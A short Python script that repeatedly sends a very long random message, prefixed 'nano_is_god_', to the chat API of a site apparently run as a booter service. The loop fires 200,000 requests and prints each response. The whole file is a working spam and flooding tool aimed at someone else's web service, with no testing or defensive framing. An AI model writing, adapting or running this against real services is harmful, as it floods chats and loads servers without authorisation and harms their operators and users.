import random, requests, threading

spam = "https://hellabooters.xyz/api/?sendchat="


ranhash = "nano_is_god_"+str(random.getrandbits(9*858))


def spammer():
    req = requests.get(spam+ranhash)

    print(req.text)

for i in range(200000):

    t1 = threading.Thread(target=spammer, name="spam")
    t1.start()
    t1.join()